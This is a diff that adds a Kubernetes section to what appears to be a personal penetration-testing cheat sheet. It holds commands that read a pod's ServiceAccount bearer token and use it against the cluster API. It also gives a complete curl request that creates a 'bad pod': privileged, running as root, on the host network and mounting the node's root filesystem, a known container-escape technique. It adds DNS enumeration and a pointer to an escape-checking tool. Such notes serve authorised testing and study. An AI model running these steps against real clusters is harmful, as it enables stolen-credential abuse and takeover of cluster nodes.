@@ -165,6 +165,99 @@ hashcat file-containing-password /path/to/wordlist
 wappalyzer = a tool that scans homepages as a extensions and gives you information what technologies it uses.
 For example php, js etc.
 
+## kubernetes
+
+OWASP kubernetes security [cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Kubernetes_Security_Cheat_Sheet.md)
+
+Depending on what tools you have available in the container you there are a number of ways of start talking to the kubernetes API.
+
+```shell
+openssl s_client -connect kubernetes.default.svc.cluster.local.:443 < /dev/null 2>/dev/null |openssl x509 -noout -text |grep -E "DNS:| IP Address:"
+```
+
+### kubernetes API
+
+Kubernetes containers contain a bunch of default env vars. These vars are easily used to talk to the kubernetes API.
+
+[access k8s api](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)
+
+```shell
+curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
+# Point to the internal API server hostname
+APISERVER=https://kubernetes.default.svc
+# Path to ServiceAccount token
+SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+# Read this Pod's namespace
+NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+# Read the ServiceAccount bearer token
+TOKEN=$(cat ${SERVICEACCOUNT}/token)
+# Reference the internal certificate authority (CA)
+CACERT=${SERVICEACCOUNT}/ca.crt
+# Explore the API with TOKEN
+curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
+
+# get all pods in your current namespace
+curl  --cacert ${CACERT} -s $APISERVER/api/v1/namespaces/$NAMESPACE/pods/ --header "Authorization: Bearer $TOKEN"
+
+# Get a specific pod
+curl  --cacert ${CACERT} -s $APISERVER/api/v1/namespaces/kube-system/pods/kube-apiserver-kind-control-plane | head -n 10
+```
+
+#### create a bad pod using rest API
+
+```shell
+curl -X POST -H 'Content-Type: application/yaml' \
+--data '
+apiVersion: v1
+kind: Pod
+metadata:
+  name: debug
+  namespace: default
+spec:
+  containers:
+    - command:
+        - /bin/sh
+      resources:
+        requests:
+          memory: "16Mi"
+          cpu: "10m"
+        limits:
+          memory: "64Mi"
+          cpu: "100m"
+      image: alpine:latest
+      name: container-00
+      securityContext:
+        privileged: true
+        runAsUser: 0
+      tty: true
+      volumeMounts:
+        - mountPath: /host
+          name: host
+  volumes:
+    - hostPath:
+        path: /
+        type: Directory
+      name: host
+  hostNetwork: true
+' "http://localhost:8001/api/v1/namespaces/default/pods"
+```
+
+#### k8s api exec using python
+
+To create a pod and [exec](https://github.com/kubernetes-client/python/blob/master/examples/pod_exec.py)
+
+### dns
+
+Outputs all dns endpoints in a cluster.
+
+```shell
+dig +noall +answer srv any.any.svc.cluster.local
+```
+
+### deepce access checker
+
+[https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)
+
 ## install
 
 ```shell
